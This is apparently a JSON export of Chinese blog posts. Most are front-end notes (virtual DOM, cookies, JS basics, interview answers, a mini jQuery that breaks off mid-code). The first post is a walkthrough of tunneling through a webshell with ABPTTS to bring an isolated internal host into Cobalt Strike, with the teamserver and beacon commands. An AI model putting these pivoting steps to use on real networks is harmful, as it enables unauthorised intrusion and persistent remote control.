[{"content":"内网穿透\u0026ndash;ABPTTS正向代理cs上线 内网穿透原理 内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。\n 隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。\n 我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。\n内网穿透\u0026ndash;应用层隧道工具 由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等\nABPTTS\nTCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp\n环境配置 # python2编写 pip install httplib2 pip install pycrypto 内网实战\u0026ndash;利用ABPTTS上线不出网的主机至cs **实战背景：**获取了webshell的主机位于内网，并且该内网主机icmp等网络层协议不能出网，tcp和udp等传输层协议不能出网，dns、http等应用层协议也不能出网，唯一的数据通道是反向代理入网的web应用。\n方案设计：利用反向代理入网的web应用所在的HTTP连接，构建正向的TCP over HTTP隧道。通过这条隧道，我们可以向内网主机发起tcp连接。生成bind类型的payload，通过webshell上传执行就会监听一个端口，我们的远控平台通过构建的TCP over HTTP隧道，去连接监听的端口即可上线。 能构建TCP over HTTP的隧道的工具有ABPTTS、Tunna、reDuh等，由于Tunna、reDuh构建的tcp连接不稳定，这里选用ABPTTS。\n上线cs 由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。\n 生成server脚本  python abpttsfactory.py -o server\n上传到web并在client执行\npython2 abpttsclient.py -c server/config.txt -u \u0026#34;http://xx.com/tyu.jsp\u0026#34; -f 127.0.0.1:4444/127.0.0.1:12344 # abptts客户端监听127.0.0.1:7777，通过http://192.168.168.121/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888 启动vps的cs server\n./teamserver vpsip fuckbibi\n创建用来反向上线ab客户端的listener 生成父beacon 上传父beacon到ABPTTS客户端执行上线（其实就是上线你自己的攻击机） 创建payload为tcp beacon的listener 生成stageless的子beacon 将生成的子beacon通过webshell上传执行  # 可以通过webshell查看网络监听，确保子beacon执行成功 netstat -ano 7. 在父beacon中连接abptts的监听ip和端口 connect 127.0.0.1:4444\n ","date":"2021-01-04T09:05:03+08:00","permalink":"http://808Mak1r.github.io/p/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-abptts%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86cs%E4%B8%8A%E7%BA%BF/","title":"内网穿透--ABPTTS正向代理cs上线"},{"content":"去掉虚拟两个字，先了解下什么是DOM？  在原生JS中有DOM操作，就是使用浏览器提供的一些API，选中一个元素对它进行操作，比如说：增加一个属性、增加一个孩子、修改它里面的内容、改变它的位置，直接对DOM操作。这个DOM实际上对应的就是浏览器里面你所能看的见的对应的某个元素。\n 那什么是虚拟DOM  假设我们要操作一个数据的报表，这个报表大概有几百条数据，我们要对这个报表进行一个排序的操作\n 我们有这样一个表格，这里面大概有100多项\n   姓名 年纪 分数 等等     小红 12 44    小花 13 78       当我去点年纪的时候，希望年纪里的所有DOM元素可以按照年纪去排序，当我点新增的时候会在表格下面再新增一行数据，当我点击姓名的时候所有DOM按照姓名去做一个排序，我们可以想下用原生JS怎么去做排序，用JS去对DOM结构去排序，操作起来很难实现，也很麻烦。\n  后来我们有了MVVM框架可以对数据排序，数据对应到页面上的DOM结构，我们只需要对数据排序，那里面的DOM结构自然就排序了。\n  我们自己实现一个框架，假设数据变了，那我们的DOM结构也就变了，难道我们需要把数据重新渲染一次，如果用户频繁大量改动数据，DOM也会频繁改动，就会造成卡顿，那我们可以去做一些优化，怎么去做优化呢？\n  那我们可以像计算机内存那样，我们可以自己设定一个虚拟的数据结构，它是对真实的DOM结构是一一对应的，我们可以先对虚拟的数据结构进行操作，等全部操作完成了，再把它渲染成真实的DOM，那就变成了真实的数据。\n   那这样做有什么好处呢？   假设用户只做了微小的改动，比如增加了2条数据，那我们可以想打补丁一样，只把这两条加到真实的DOM里，而不用把整个DOM重新渲染。\n 那这是虚拟DOM以及他的作用\n那虚拟DOM就是针对真实DOM做的一个一一映射的类似虚拟的数据结构，有了变化再把数据结构渲染到DOM里，做到局部的变化，实现行能优化。\n那我们怎么实现它呢  以下代码为将数据结构如何转化为虚拟DOM，然后将虚拟DOM渲染到页面中变成真正的DOM。   class VNode { constructor(tag, children, text) { this.tag = tag this.text = text this.children = children } render() { if(this.tag === '#text') { return document.createTextNode(this.text) } let el = document.createElement(this.tag) this.children.forEach(vChild =\u0026gt; { el.appendChild(vChild.render()) }) return el } } function v(tag, children, text) { if(typeof children === 'string') { text = children children = [] } return new VNode(tag, children, text) } /* //虚拟的JSON格式的数据结构 let nodesData = { tag: 'div', children: [ { tag: 'p', children: [ { tag: 'span', children: [ { tag: '#text', text: 'hi' } ] } ] }, { tag: 'span', children: [ { tag: '#text', text: 'oo' } ] } ] } */ let vNodes = v('div', [ v('p', [ v('span', [ v('#text', 'hi') ] ) ] ), v('span', [ v('#text', 'oo') ]) ] ) console.log(vNodes.render()) 什么是diff 我们需要做一些改变的时候，比如增删改查，那么我们需要将改变后的虚拟DOM树与真实的DOM树做对比，找出差异，然后做到局部更新改变的地方，那么找出差异就是diff（算法找两棵DOM树的差异）。\n 以下代码为简单的实现 DOM diff\nfunction patchElement(parent, newVNode, oldVNode, index = 0) { if(!oldVNode) { parent.appendChild(newVNode.render()) } else if(!newVNode) { parent.removeChild(parent.childNodes[index]) } else if(newVNode.tag !== oldVNode.tag || newVNode.text !== oldVNode.text) { parent.replaceChild(newVNode.render(), parent.childNodes[index]) } else { for(let i = 0; i \u0026lt; newVNode.children.length || i \u0026lt; oldVNode.children.length; i++) { patchElement(parent.childNodes[index], newVNode.children[i], oldVNode.children[i], i) } } } let vNode1 = v('div', [ v('p', [ v('span', [ v('#text', 'hi') ] ) ] ), v('span', [ v('#text', 'oo') ]) ] ) let vNode2 = v('div', [ v('p', [ v('span', [ v('#text', 'hi') ] ) ] ), v('span', [ v('#text', 'oo'), v('#text', 'xx') ]) ] ) const root = document.querySelector('#root') patchElement(root, vNode1) patchElement(root, vNode1，vNode2) ","date":"2019-08-20T17:57:12+08:00","permalink":"http://808Mak1r.github.io/p/test-post/","title":"试着去理解虚拟DOM"},{"content":"维基百科定义 Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明[2]。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。\n我的理解  Cookie就是用户登录网站，浏览器去访问服务器问这个人能不能登录，然后服务器传送给浏览器的一段数据。 浏览器会保留这段数据，不能随便删除（一般默认20分钟左右，浏览器不同具体时间不同） 然后这段时间内用户通过浏览器继续访问服务器，都必须带一个Cookie Cookie 默认在用户关闭页面后就失效，后台代码可以任意设置 Cookie 的过期时间 大小大概在 4kb 以内  Cookie的特点  服务器通过 Set-Cookie 响应头设置Cookie 浏览器得到Cookie之后，每次请求都要带上Cookie 服务器读取Cookie就知道登录用户的信息（用户名啥的）  如何使用 Cookie Cookie 一般有两个作用。\n第一个作用是识别用户身份 比如用户小红用浏览器访问了 http://qq.com，那么qq 的服务器就会立刻给小红返回一段数据就是Cookie。当 小红 再次访问qq的其他页面时，就会附带上这段数据。\n同理有个小白用浏览器访问了 http://qq.com，那么qq 的服务器就会立刻给小白返回一段数据就是Cookie。当 小白 再次访问qq的其他页面时，就会附带上这段数据。\n借此，http://qq.com 的服务器就能区分 小白和 小红 两个用户了。\n第二个作用是记录历史 http://taobao.com 是一个购物网站，当 小红 在上面将商品 白鞋 、酱油 加入购物车时，JS 可以改写 Cookie，在Cookie中添加两个商品的信息，表示购物车里有 白鞋 和 酱油 两样商品了。\n这样一来，当用户关闭网页，过三天再打开网页的时候，依然可以看到 白鞋、酱油 躺在购物车里，因为浏览器并不会无缘无故地删除这个 Cookie。\n借此，就达到里记录用户操作历史的目的了。\n","date":"2019-07-05T00:00:00Z","permalink":"http://808Mak1r.github.io/p/cookie%E6%98%AF%E4%BB%80%E4%B9%88/","title":"Cookie是什么"},{"content":"原型与原型链 var object = {} object.__proto__ === Object.prototype // 为 true var fn = function(){} fn.__proto__ === Function.prototype // 为 true fn.__proto__.__proto__ === Object.prototype // 为 true var array = [] array.__proto__ === Array.prototype // 为 true array.__proto__.__proto__ === Object.prototype // 为 true Function.__proto__ === Function.prototype // 为 true Array.__proto__ === Function.prototype // 为 true Object.__proto__ === Function.prototype // 为 true true.__proto__ === Boolean.prototype // 为 true Function.prototype.__proto__ === Object.prototype // 为 true 面向对象new与this function fn(){ console.log(this) } new fn() new fn() 会执行 fn，并打印出 this，请问这个 this 有哪些属性？这个 this 的原型有哪些属性？\n this 自身没有属性（只有一个隐藏的 proto 属性） this 的原型是 fn.prototype，只有一个属性 constructor，且 constructor === fn（另外还有一个隐藏属性 proto，指向 Object.prototype  JSON与JavaScript JSON 和 JavaScript 是什么关系? 关系：JSON 是一门抄袭/借鉴 JavaScript 的语言，同时也是一种数据交互格式，JSON 是 JavaScript 的子集（或者说 JSON 只抄袭了一部分 JavaScript 语法，而且没有新增任何原创的语法）\nJSON 和 JavaScript 的区别有哪些？ 区别：JSON 不支持函数、undefined、变量、引用、单引号字符串、对象的key不支持单引号也不支持不加引号、没有内置的 Date、Math、RegExp 等。 而 JavaScript 全都支持。\n前端MVC 前端 MVC 是什么？  MVC 是一种设计模式（或者软件架构），把系统分为三层：Model数据、View视图和Controller控制器。 Model 数据管理，包括数据逻辑、数据请求、数据存储等功能。前端 Model 主要负责 AJAX 请求或者 LocalStorage 存储 View 负责用户界面，前端 View 主要负责 HTML 渲染。 Controller 负责处理 View 的事件，并更新 Model；也负责监听 Model 的变化，并更新 View，Controller 控制其他的所有流程。  MVC 三个对象分别有哪些重要属性和方法  代码1-将MVC分别存为3个基础文件将共有的属性放进去Model.js,View.js,Controller.js  window.Controller = function(options){ var init = options.init let object = { view: null, model: null, init: function (view, model) { this.view = view this.model = model this.model.init() init.call(this, view, model) options.bindEvents.call(this) } } for(let key in options){ if(key !== 'init'){ object[key] = options[key] } } return object } window.Model = function(options) { let resourceName = options.resourceName return{ init: function () { var APP_ID = ''; var APP_KEY = ''; AV.init({ appId: APP_ID, appKey: APP_KEY }) }, //获取数据 fetch: function () { var query = new AV.Query(resourceName); return query.find() //Promise对象 }, //创建数据 save: function (object) { var X = AV.Object.extend(resourceName); var x = new X(); return x.save(object) } } } window.View = function(selector){ return document.querySelector(selector) }  代码2-每个模块自己独有的MVC  var model = { data: null, init(){} fetch(){} save(){} update(){} delete(){} } view = { init() {} template: '\u0026lt;h1\u0026gt;hi\u0026lt;/h1'\u0026gt; } controller = { view: null, model: null, init(view, model){ this.view = view this.model = model this.bindEvents() } render(){ this.view.querySelector('name').innerText = this.model.data.name }, bindEvents(){} } 在 ES5 中如何用函数模拟一个类 ES 5 没有 class 关键字，所以只能使用函数来模拟类。\nfunction Human(name){ this.name = name } Human.prototype.run = function(){} var person = new Human('qq') Promise相关 jQuery 或者 axios 的 AJAX 功能，都返回的是 Promise 对象。\n$.ajax({url:'/xxx', method:'get'}).then(success1, error1).then(success2, error2) 如果我自己创建 Promise 对象，我会这么写\nfunction asyncMethod(){ return new Promise(function (resolve, reject){ setTimeout(function(){ 成功则调用 resolve 失败则调用 reject },3000) }) } ","date":"2019-06-29T15:31:03+08:00","permalink":"http://808Mak1r.github.io/p/js%E9%AB%98%E7%BA%A7%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93/","title":"JS高级基础知识小结"},{"content":"请写出一个符合 W3C 规范的 HTML 文件 要求\n页面标题为「我的页面」\n页面中引入了一个外部 CSS 文件，文件路径为 /style.css\n页面中引入了另一个外部 CSS 文件，路径为\n/print.css，该文件仅在打印时生效\n页面中引入了另一个外部 CSS 文件，路径为\n/mobile.css，该文件仅在设备宽度小于 500 像素时生效\n页面中引入了一个外部 JS 文件，路径为 /main.js\n页面中引入了一个外部 JS 文件，路径为 /gbk.js，文件编码为 GBK\n页面中有一个 SVG 标签，SVG 里面有一个直径为 100 像素的圆圈，颜色随意 注意题目中的路径\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;我的页面\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;/style.css\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;/print.css\u0026quot; media=\u0026quot;print\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;/mobile.css\u0026quot; media=\u0026quot;(max-width: 500px)\u0026quot;\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; *{ padding: 0; margin: 0; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;circle cx=\u0026quot;100\u0026quot; cy=\u0026quot;100\u0026quot; r=\u0026quot;50\u0026quot; fill=\u0026quot;black\u0026quot;\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;./main.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;./gbk.js\u0026quot; charset=\u0026quot;GBK\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 移动端是怎么做适配的？ 回答要点：\nmeta viewport\n媒体查询\n动态 rem 方案\n1.meta viewport 在head标签内部加上这段代码 \u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\u0026quot;\u0026gt; 该meta标签的作用是让当前viewport的宽度等于设备的宽度，同时不允许用户手动缩放。也许允不允许用户缩放不同的网站有不同的要求，但让viewport的宽度等于设备的宽度。 width=device-width: 让当前viewport宽度等于设备的宽度 user-scalable=no: 禁止用户缩放 initial-scale=1.0: 设置页面的初始缩放值为不缩放 maximum-scale=1.0: 允许用户的最大缩放值为1.0 minimum-scale=1.0: 允许用户的最小缩放值为1.0 2.媒体查询 @media （）and（）{} //满足（）里的条件，就执行大括号里css的样式 \u0026lt;style\u0026gt; @media (max-width:320px){ body{ background: red; } } \u0026lt;/style\u0026gt; 当最大宽度分辨率满足，就生效这个红色背景的CSS样式 3.动态 rem 方案 1rem等于根元素html的font-size的值，那么可以调整根元素的font-size值来调整页面缩放后的各个元素的尺寸和定位。 在script标签加入这段代码： \u0026lt;script\u0026gt; var pageWidth=window.innerWidth //获取屏幕宽度 document.documentElement.style.fontSize= `${pageWidth/60}px` \u0026lt;/script\u0026gt; 此处，fontSizede的值为屏幕宽的十分之一，那么在写CSS的时候可以这样写： .xxx{ width:0.4rem; height:0.2rem; margin:0.05rem 0.05rem; float:left; } 用sass将px转化为rem： @function px( $px ){ @return $px/$designWidth*10 + rem; } $designWidth: 320px; 那么1rem=32px 用过CSS3吗? 实现圆角矩形和阴影怎么做? 用过CSS3。 1.实现圆角 实现圆角矩形 使用 border-radius 属性： border-radius: 6px; 当使用一个半径时确定一个圆形；当使用两个半径时确定一个椭圆，这个(椭)圆与边框的交集形成圆角效果。 取值： 用 px 等 css 长度单位值来定义圆形半径或椭圆的半长轴，半短轴。不能用负值。 使用百分数定义圆形半径或椭圆的半长轴，半短轴。水平半轴相对于盒模型的宽度；垂直半轴相对于盒模型的高度。不能用负值。 border-radius 属性又可以细分为以下 4 个属性，从左上角开始，逆时针依次为： border-top-left-radius border-top-right-radius border-bottom-right-radius border-bottom-left-radius 因此，可以为四个角各自单独设置，也可以用简写的 border-radius 属性一起设置。 border-radius: 6px; /* 相当于 */ border-top-left-radius: 6px; border-top-right-radius: 6px; border-bottom-right-radius: 6px; border-bottom-left-radius: 6px; 和其他简写属性类似，无法为个别值设定为继承，如 border-radius:0 0 inherit inherit，这会覆盖一部分现有定义。在这种情况下只能使用完整属性来指定。 2.阴影 有两种属性可以先实现阴影： box-shadow 属性和 text-shadow 属性 使用 box-shadow 属性： box-shadow: inset 2px 2px 2px 1px red; 会生成一个在边框内，水平、竖直偏移量均为 2px，模糊半径为 2px，同时阴影会扩大 1px 的红色阴影。 box-shadow使用一个或多个投影，如果使用多个投影时必须需要用逗号“，”分开。 对象选择器 {box-shadow:inset x-offset y-offset blur-radius spread-radius color} 对象选择器 {box-shadow:投影方式 X轴偏移量 Y轴偏移量 阴影模糊半径 阴影扩展半径 阴影颜色} 为文字添加阴影可以用 text-shadow 属性： text-shadow: 2px 2px 2px red; 会生成一个水平、竖直偏移量均为 2px，模糊半径为 2px 的红色阴影。 两个属性都可以有多组阴影值，多组阴影值之间用逗号相隔；多个阴影时会从前往后叠加，第一个阴影在最上面。 什么是闭包，闭包的用途是什么？ 1.什么是闭包？ function f1(){ var n=999; function f2(){ alert(n); } return f2; } 上面代码中的f2函数，就是闭包。 闭包就是能够读取其他函数内部变量的函数。 由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成\u0026quot;定义在一个函数内部的函数\u0026quot;。 所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。 2.闭包的用途是什么？ 用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。 function f1() { var n = 999; nAdd = function () { n += 1 } function f2() { alert(n); } return f2; } var result = f1(); result(); // 999 nAdd(); result(); // 1000 在这段代码中，result实际上就是闭包f2函数。它一共运行了两次，第一次的值是999，第二次的值是1000。这证明了，函数f1中的局部变量n一直保存在内存中，并没有在f1调用后被自动清除。 为什么会这样呢？原因就在于f1是f2的父函数，而f2被赋给了一个全局变量，这导致f2始终在内存中，而f2的存在依赖于f1，因此f1也始终在内存中，不会在调用结束后，被垃圾回收机制（garbage collection）回收。 call、apply、bind 的用法分别是什么？ apply()、call()和bind()方法都是Function.prototype对象中的方法，而所有的函数都是Function的实例。三者都可以改变this的指向，将函数绑定到上下文中。 apply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数。 语法 func.apply(thisArg, [argsArray]) call() 方法调用一个函数, 其具有一个指定的this值和分别地提供的参数(参数的列表)。 语法 fun.call(thisArg, arg1, arg2, ...) bind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。 语法 fun.bind(thisArg, 队列or数组)() 这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中this的指向。 function add(a,b){ return a+b; } add.call(add, 5, 3); //8 add.apply(add, [5, 3]); //8 bind：bind 接受的参数跟 call 一致，只是 bind 不会立即调用，它会生成一个新的函数，你想什么时候调就什么时候调。如下代码： function add(a, b){ return a+b; } var foo1 = add.bind(add, 5,3); foo1(); //8 var foo1 = add.bind(add, 5,3); foo1(); //8 请说出至少 8 个 HTTP 状态码，并描述各状态码的意义。 例如：\n状态码 200 表示响应成功。\n1xx(临时响应)表示临时响应并需要请求者继续执行操作的状态代码。 100 (继续) 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101 (切换协议) 请求者已要求服务器切换协议，服务器已确认并准备切换。 2xx (成功)表示成功处理了请求的状态代码。 200 (成功) 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。 201 (已创建) 请求成功并且服务器创建了新的资源。 202 (已接受) 服务器已接受请求，但尚未处理。 203 (非授权信息) 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 (无内容) 服务器成功处理了请求，但没有返回任何内容。 205 (重置内容) 服务器成功处理了请求，但没有返回任何内容。 206 (部分内容) 服务器成功处理了部分 GET 请求。 3xx (重定向) 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。 300 (多种选择) 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 (永久移动) 请求的网页已永久移动到新位置。 服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 302 (临时移动) 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 (查看其他位置) 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 (未修改) 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。 305 (使用代理) 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。 307 (临时重定向) 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 4xx(请求错误) 这些状态代码表示请求可能出错，妨碍了服务器的处理。 400 (错误请求) 服务器不理解请求的语法。 401 (未授权) 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 403 (禁止) 服务器拒绝请求。 404 (未找到) 服务器找不到请求的网页。 405 (方法禁用) 禁用请求中指定的方法。 406 (不接受) 无法使用请求的内容特性响应请求的网页。 407 (需要代理授权) 此状态代码与 401(未授权)类似，但指定请求者应当授权使用代理。 408 (请求超时) 服务器等候请求时发生超时。 409 (冲突) 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 410 (已删除) 如果请求的资源已永久删除，服务器就会返回此响应。 411 (需要有效长度) 服务器不接受不含有效内容长度标头字段的请求。 412 (未满足前提条件) 服务器未满足请求者在请求中设置的其中一个前提条件。 413 (请求实体过大) 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 (请求的 URI 过长) 请求的 URI(通常为网址)过长，服务器无法处理。 415 (不支持的媒体类型) 请求的格式不受请求页面的支持。 416 (请求范围不符合要求) 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 (未满足期望值) 服务器未满足\u0026quot;期望\u0026quot;请求标头字段的要求。 5xx(服务器错误)这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。 500 (服务器内部错误) 服务器遇到错误，无法完成请求。 501 (尚未实施) 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。 502 (错误网关) 服务器作为网关或代理，从上游服务器收到无效响应。 503 (服务不可用) 服务器目前无法使用(由于超载或停机维护)。 通常，这只是暂时状态。 504 (网关超时) 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 (HTTP 版本不受支持) 服务器不支持请求中所用的 HTTP 协议版本。 请写出一个 HTTP post 请求的内容，包括四部分。 其中 第四部分的内容是 username=ff\u0026amp;password=123\n第二部分必须含有 Content-Type 字段\n请求的路径为 /path\n1 POST /path HTTP/1.1 2 Host: www.demo.com 2 Cache-Control: no-cache 2 Postman-Token: 81d7b315-d4be-8ee8-1237-04f3976de032 2 Content-Type: application/x-www-form-urlencoded 3 4 username=ff\u0026amp;password=123 请说出至少三种排序的思路，这三种排序的时间复杂度分别为 O(n*n)\nO(n log2 n)\nO(n + max)\n1.O(n*n)冒泡排序（升序） 选择第1个和第2个数字，如果第1个\u0026gt;第2个则二者交换位置，之后选择第2个和第3个数字，类似交换处理，一轮下来后，最大的数字会冒泡到最后一位。接下来，忽略已经排好的数字，对剩下的数字进行新一轮排序，直到所有数字都排序完成。 2.O(n log2 n)快速排序 从数列中挑出一个元素称为基准； 重新排序数列，所有比基准值小的元素放在基准前面，所有比基准值大的元素放在基准后面(相等的数可以放在任一边)； 递归的把小于基准值的子数列和大于基准值的子数列排序； 递归到最底部时，数列的大小是零或一，也就是已经排序好了。 3.O(n + max)基数排序 将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后，数列就变成一个有序序列。 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ 这一题是在挖掘你的知识边界，所以你知道多少就要答多少。\n可以先查阅一些资料再查，但是不要把自己不懂的东西放在答案里，面试官会追问的。\n1.DNS解析 DNS解析的过程就是寻找哪台机器上有你需要资源的过程。当你在浏览器中输入一个地址时，例如www.baidu.com，其实不是百度网站真正意义上的地址。互联网上每一台计算机的唯一标识是它的IP地址，但是IP地址并不方便记忆。用户更喜欢用方便记忆的网址去寻找互联网上的其它计算机，也就是上面提到的百度的网址。所以互联网设计者需要在用户的方便性与可用性方面做一个权衡，这个权衡就是一个网址到IP地址的转换，这个过程就是DNS解析。 2.TCP连接 每次建立连接前，客户端和服务端之前都要先进行三次对话才开始正式传输内容，三次对话大概是这样的： 1. 客户端：我要连接你了，可以吗 2. 服务端：嗯，我准备好了，连接我吧 3. 客户端：那我连接你咯。 4. 开始后面步骤 3.发送HTTP请求 其实这部分又可以称为前端工程师眼中的HTTP，它主要发生在客户端。发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。 1 动词 路径 协议/版本 2 Key1: value1 2 Key2: value2 2 Key3: value3 2 Content-Type: application/x-www-form-urlencoded 2 Host: www.baidu.com 2 User-Agent: curl/7.54.0 3 4 要上传的数据 4.服务器处理请求并返回HTTP报文 HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。 状态码 状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值: 1xx：指示信息–表示请求已接收，继续处理。 2xx：成功–表示请求已被成功接收、理解、接受。 3xx：重定向–要完成请求必须进行更进一步的操作。 4xx：客户端错误–请求有语法错误或请求无法实现。 5xx：服务器端错误–服务器未能实现合法的请求。 平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500 5.浏览器解析渲染页面 浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上 6.连接结束 通过四次挥手关闭连接。一端断开连接需要两次挥手（请求和回应），两端断开连接就需要四次挥手。 如何实现数组去重？ 假设有数组 array = [1,5,2,3,4,2,3,1,3,4]\n你要写一个函数 unique，使得 unique(array) 的值为 [1,5,2,3,4] 也就是把重复的值都去掉，只保留不重复的值。\n要求：\n不要做多重循环，只能遍历一次 请给出两种方案，一种能在 ES 5 环境中运行，一种能在 ES 6 环境中运行（提示 ES 6 环境多了一个 Set 对象）\nES 5 ES5 提供了 filter 方法，我们可以用来简化外层循环： 比如使用 indexOf 的方法： function unique(array) { var res = array.filter(function(item, index, array){ return array.indexOf(item) === index; }) return res; } console.log(unique(array)); 排序去重的方法： function unique(array) { return array.concat().sort().filter(function(item, index, array){ return !index || item !== array[index - 1] }) } console.log(unique(array)); ES 6 function unique(array) { return [...new Set(array)]; } ","date":"2019-06-06T17:35:48+08:00","permalink":"http://808Mak1r.github.io/p/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%B0%8F%E8%AE%A1/","title":"面试题小计"},{"content":"为了便于学习与理解jQuery，自己尝试去写一个只有两个API的简版jQuery。\n什么是JQuery jQuery是js的一个工具库，由John Resig在2006年发布。\nj代表JavaScript，query是“查询”的意思。也就是说，这个库的意图是基于JavaScript的查询。\n查询的目标是什么？\n答案是DOM（文档对象模型）结构中的Node（节点）。一个网页就是一个html文档，而网页上的所有内容都是节点，包括文档节点、元素节点、文本节点、注释节点、属性节点等等。而jQuery的查询最主要针对的是元素节点，如段落（p）、锚点（a）、表格（table）等，只有少数方法可以处理文本节点与注释节点。同时jQuery还可以用attr方法方便地对元素节点的属性进行读取/设置。\njQuery的核心是通过各种选择器，选中DOM元素\n节点或者选择器判断 由于jQuery支持传参字符串，所以先判断参数\nwindow.jQuery = function(nodeOrSelector) { let nodes = {} if (typeof nodeOrSelector === 'string') { let temp = document.querySelectorAll(nodeOrSelector) for (let i = 0; i \u0026lt; temp.length; i++) { nodes[i] = temp[i] } nodes.length = temp.length } else if (nodeOrSelector instanceof Node) { nodes = { 0: nodeOrSelector, length: 1 } } return nodes } addClass方法 jQuery的addClass方法，用于为DOM元素添加一个class。\n　$('body').addClass('hasJS'); DOM元素本身有一个可读写的className属性，可以用来操作class。\n　document.body.className = 'hasJS'; // or document.body.className += ' hasJS'; HTML 5还提供一个classList对象，功能更强大（IE 9不支持）。\n　document.body.classList.add('hasJS'); document.body.classList.remove('hasJS'); document.body.classList.toggle('hasJS'); document.body.classList.contains('hasJS'); 自己动手实现addClass方法\n nodes.addClass = function(classes) { for (let i = 0; i \u0026lt; nodes.length;i++) { nodes[i].classList.add(classes) } } setText方法 改变textContent的值\n nodes.setText = function(text) { for (let i = 0; i \u0026lt; nodes.length; i++) { nodes[i].textContent = text } } 完整代码\nwindow.jQuery = function(nodeOrSelector) { let nodes = {} if (typeof nodeOrSelector === 'string') { let temp = document.querySelectorAll(nodeOrSelector) for (let i = 0; i \u0026lt; temp.length; i++) { 